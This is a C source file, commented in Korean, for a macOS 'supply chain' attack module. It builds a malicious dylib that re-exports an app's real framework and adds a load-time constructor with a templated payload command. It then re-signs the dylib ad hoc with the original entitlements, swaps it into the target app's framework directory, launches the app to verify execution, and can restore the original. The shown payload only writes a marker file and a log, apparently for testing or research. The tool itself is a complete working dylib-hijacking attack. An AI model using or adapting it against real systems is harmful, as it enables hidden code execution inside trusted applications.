/**
 * framework_supply_chain.c
 *
 * Type B 공격 모듈 구현
 *
 * 기능:
 * - 앱의 Framework 분석
 * - Re-export dylib 자동 생성
 * - Framework 공격 배포 및 검증
 */

#include "framework_supply_chain.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>

#define TEMP_DIR "/tmp"
#define MAX_PATH_LEN 1024
#define MAX_PAYLOAD_LEN 8192


/* ============================================================ */
/* Framework 정보 분석                                          */
/* ============================================================ */

SCFrameworkInfo* sc_analyze_framework(
    const char *app_path,
    const char *framework_path)
{
    if (!app_path || !framework_path) {
        fprintf(stderr, "[ERROR] Invalid arguments\n");
        return NULL;
    }

    SCFrameworkInfo *fw = malloc(sizeof(SCFrameworkInfo));
    if (!fw) {
        fprintf(stderr, "[ERROR] Memory allocation failed\n");
        return NULL;
    }

    fw->path = malloc(strlen(framework_path) + 1);
    strcpy(fw->path, framework_path);

    /* dylib 경로 구성 (예: .../Sparkle.framework/Versions/B/Sparkle) */
    char *framework_name = strrchr(framework_path, '/');
    if (framework_name) {
        framework_name++;
    } else {
        framework_name = (char *)framework_path;
    }

    /* "XXX.framework" → "XXX" */
    char name_only[256];
    sscanf(framework_name, "%255[^.]", name_only);
    fw->name = malloc(strlen(name_only) + 1);
    strcpy(fw->name, name_only);

    /* dylib 경로 (기본 위치) */
    fw->dylib_path = malloc(MAX_PATH_LEN);
    snprintf(fw->dylib_path, MAX_PATH_LEN, "%s/Versions/B/%s", framework_path, fw->name);

    /* 실제 파일 존재 확인 */
    if (access(fw->dylib_path, F_OK) != 0) {
        snprintf(fw->dylib_path, MAX_PATH_LEN, "%s/Versions/A/%s", framework_path, fw->name);
    }

    fw->shared_app_count = 1; /* 최소 1개 (현재 앱) */
    fw->shared_apps = NULL;

    return fw;
}

void sc_free_framework_info(SCFrameworkInfo *fw)
{
    if (!fw) return;
    free(fw->path);
    free(fw->name);
    free(fw->dylib_path);
    if (fw->shared_apps) {
        for (size_t i = 0; i < fw->shared_app_count; i++) {
            free(fw->shared_apps[i]);
        }
        free(fw->shared_apps);
    }
    free(fw);
}

/* ============================================================ */
/* Re-export dylib 생성                                         */
/* ============================================================ */

bool sc_generate_malicious_dylib_with_reexport(
    SupplyChainAttackContext *ctx)
{
    if (!ctx || !ctx->target_app_path) {
        fprintf(stderr, "[ERROR] Invalid context\n");
        return false;
    }

    printf("\n[*] Re-export dylib 생성\n");

    /* Step 1: 백업 생성 */
    printf("  [Step 1] 원본 Framework 백업\n");
    if (ctx->backup_dylib_path == NULL) {
        ctx->backup_dylib_path = malloc(MAX_PATH_LEN);
        snprintf(ctx->backup_dylib_path, MAX_PATH_LEN, "%s/%s", TEMP_DIR, ctx->framework->name);
    }

    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" 2>&1",
             ctx->framework->dylib_path, ctx->backup_dylib_path);
    if (system(cmd) != 0) {
        fprintf(stderr, "    [ERROR] 백업 실패\n");
        return false;
    }
    printf("    [✓] 백업: %s\n", ctx->backup_dylib_path);

    /* Step 2: 백업 dylib에 install_name 설정 */
    printf("  [Step 2] 백업 dylib install_name 설정\n");
    snprintf(cmd, sizeof(cmd), "install_name_tool -id \"%s\" \"%s\" 2>&1",
             ctx->backup_dylib_path, ctx->backup_dylib_path);
    system(cmd);

    /* Step 3: 백업 dylib 코드 서명 */
    printf("  [Step 3] 백업 dylib 코드 서명\n");
    snprintf(cmd, sizeof(cmd), "codesign -f -s - \"%s\" 2>&1",
             ctx->backup_dylib_path);
    system(cmd);

    /* Step 4: payload/template.c 복사 및 치환 */
    printf("  [Step 4] payload/template.c 기반 C 코드 생성\n");
    char malicious_c_path[MAX_PATH_LEN];
    char success_marker[MAX_PATH_LEN];
    char attack_log[MAX_PATH_LEN];

    snprintf(success_marker, MAX_PATH_LEN, "/tmp/sc_%s_success", ctx->framework->name);
    snprintf(attack_log, MAX_PATH_LEN, "/tmp/sc_%s_attack.log", ctx->framework->name);
    snprintf(malicious_c_path, MAX_PATH_LEN, "%s/malicious_%s.c",
             TEMP_DIR, ctx->framework->name);

    /* payload/template.c 기반으로 컴파일 및 치환 */
    /* Payload 명령: 마커 생성만 (로그는 C 코드에서 처리) */
    char payload_cmd[256];
    snprintf(payload_cmd, sizeof(payload_cmd), "touch %s", success_marker);

    char sed_cmd[2048];
    snprintf(sed_cmd, sizeof(sed_cmd),
             "sed -e 's|{{DYLIB_NAME}}|%s|g' -e 's|{{PAYLOAD_COMMAND}}|%s|g' "
             "payload/template.c > %s",
             ctx->framework->name,
             payload_cmd,
             malicious_c_path);

    /* Step 4-1: sed 실행으로 파일 생성 */
    if (system(sed_cmd) != 0) {
        fprintf(stderr, "    [ERROR] 파일 생성 실패\n");
        return false;
    }

    /* Step 4-2: 로그 작성 기능 추가 (sed 후에 append) */
    char log_code[1024];
    snprintf(log_code, sizeof(log_code),
             "\nvoid log_sc_attack(void) __attribute__((constructor));\n"
             "void log_sc_attack(void) {\n"
             "    FILE *log = fopen(\"%s\", \"a\");\n"
             "    if (log) {\n"
             "        fprintf(log, \"[Supply Chain Attack Success]\\n\");\n"
             "        fprintf(log, \"Framework: %s\\n\");\n"
             "        fprintf(log, \"PID: %%d\\n\", getpid());\n"
             "        fclose(log);\n"
             "    }\n"
             "}\n",
             attack_log,
             ctx->framework->name);

    FILE *temp_c = fopen(malicious_c_path, "a");
    if (temp_c) {
        fprintf(temp_c, "%s", log_code);
        fclose(temp_c);
    }

    ctx->attack_log_path = malloc(strlen(success_marker) + 1);
    strcpy(ctx->attack_log_path, success_marker);

    printf("    [✓] C 코드: %s\n", malicious_c_path);
    printf("    [✓] 성공 마커: %s\n", success_marker);
    printf("    [✓] 공격 로그: %s\n", attack_log);

    /* Step 5: 악성 dylib 컴파일 (re-export) */
    printf("  [Step 5] Re-export dylib 컴파일\n");
    if (ctx->malicious_dylib_path == NULL) {
        ctx->malicious_dylib_path = malloc(MAX_PATH_LEN);
        snprintf(ctx->malicious_dylib_path, MAX_PATH_LEN, "%s/%s_malicious",
                 TEMP_DIR, ctx->framework->name);
    }

    /* Re-export dylib 컴파일 (Universal binary: x86_64 + arm64) */
    snprintf(cmd, sizeof(cmd),
             "clang -fPIC -dynamiclib -undefined dynamic_lookup -framework Foundation "
             "-arch arm64 -arch x86_64 "
             "-Wl,-install_name,%s "
             "-Wl,-reexport_library,\"%s\" "
             "\"%s\" -o \"%s\"",
             ctx->framework->name,
             ctx->backup_dylib_path,
             malicious_c_path,
             ctx->malicious_dylib_path);

    if (system(cmd) != 0) {
        fprintf(stderr, "    [ERROR] Re-export 컴파일 실패\n");
        unlink(malicious_c_path);
        return false;
    }
    printf("    [✓] Re-export dylib 컴파일 완료\n");

    /* Step 6: 코드 서명 (entitlements 추출하여 ad-hoc 서명) */
    printf("  [Step 6] 코드 서명\n");

    /* 원본 dylib의 entitlements 추출 */
    char entitlements_path[MAX_PATH_LEN];
    snprintf(entitlements_path, MAX_PATH_LEN, "/tmp/%s_ent.plist", ctx->framework->name);

    snprintf(cmd, sizeof(cmd),
             "codesign -d --entitlements :- \"%s\" > \"%s\" 2>/dev/null || true",
             ctx->backup_dylib_path,
             entitlements_path);
    system(cmd);

    /* entitlements를 포함하여 re-sign */
    snprintf(cmd, sizeof(cmd),
             "codesign -f -s - --entitlements \"%s\" \"%s\" 2>&1",
             entitlements_path,
             ctx->malicious_dylib_path);
    system(cmd);

    unlink(entitlements_path);

    /* 정리 */
    unlink(malicious_c_path);
    ctx->is_reexport_enabled = true;

    printf("  [✓] Re-export dylib 생성 완료\n");
    return true;
}

/* ============================================================ */
/* Framework 공격 배포                                            */
/* ============================================================ */

bool sc_deploy_supply_chain_attack(SupplyChainAttackContext *ctx)
{
    if (!ctx || !ctx->malicious_dylib_path || !ctx->framework->dylib_path) {
        fprintf(stderr, "[ERROR] Invalid context\n");
        return false;
    }

    printf("\n[*] Framework 공격 배포\n");

    /* 공격 로그 초기화 */
    if (ctx->attack_log_path) {
        unlink(ctx->attack_log_path);
    }

    /* 악성 dylib 배포 */
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" 2>&1",
             ctx->malicious_dylib_path,
             ctx->framework->dylib_path);

    if (system(cmd) != 0) {
        fprintf(stderr, "  [ERROR] 배포 실패 (권한 없음)\n");
        return false;
    }

    printf("  [✓] 악성 Framework 배포: %s\n", ctx->framework->dylib_path);
    ctx->is_deployed = true;
    return true;
}

/* ============================================================ */
/* 공격 검증                                                   */
/* ============================================================ */

bool sc_verify_supply_chain_attack(
    SupplyChainAttackContext *ctx,
    const char *app_to_run,
    const char *expected_keyword)
{
    if (!ctx || !app_to_run || !expected_keyword) {
        fprintf(stderr, "[ERROR] Invalid arguments\n");
        return false;
    }

    printf("\n[*] Framework 공격 검증\n");
    printf("  [*] 실행: %s\n", app_to_run);

    /* 앱 실행 */
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "\"%s\" > /dev/null 2>&1 &", app_to_run);
    system(cmd);

    /* 6초 대기 */
    sleep(6);

    /* 프로세스 종료 */
    snprintf(cmd, sizeof(cmd), "pkill -f \"%s\" 2>/dev/null || true", app_to_run);
    system(cmd);
    sleep(3);

    /* 성공 마커 파일 확인 */
    if (ctx->attack_log_path && access(ctx->attack_log_path, F_OK) == 0) {
        printf("  [✓] 악성 코드 실행 확인 (성공 마커 파일: %s)\n", ctx->attack_log_path);
        printf("  [✓] 공격 성공!\n");
        return true;
    }

    printf("  [✗] 공격 검증 실패 (성공 마커 파일 없음: %s)\n", ctx->attack_log_path);
    return false;
}

/* ============================================================ */
/* 원본 복구                                                   */
/* ============================================================ */

bool sc_restore_original_framework(SupplyChainAttackContext *ctx)
{
    if (!ctx || !ctx->backup_dylib_path || !ctx->framework->dylib_path) {
        fprintf(stderr, "[ERROR] Invalid context\n");
        return false;
    }

    printf("\n[*] 원본 Framework 복구\n");

    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" 2>&1",
             ctx->backup_dylib_path,
             ctx->framework->dylib_path);

    if (system(cmd) != 0) {
        fprintf(stderr, "  [ERROR] 복구 실패\n");
        return false;
    }

    printf("  [✓] 복구 완료\n");
    return true;
}

/* ============================================================ */
/* 메모리 해제                                                 */
/* ============================================================ */

void sc_free_supply_chain_context(SupplyChainAttackContext *ctx)
{
    if (!ctx) return;
    free(ctx->target_app_path);
    free(ctx->target_framework_path);
    free(ctx->backup_dylib_path);
    free(ctx->malicious_dylib_path);
    free(ctx->attack_log_path);
    if (ctx->framework) {
        sc_free_framework_info(ctx->framework);
    }
    free(ctx);
}
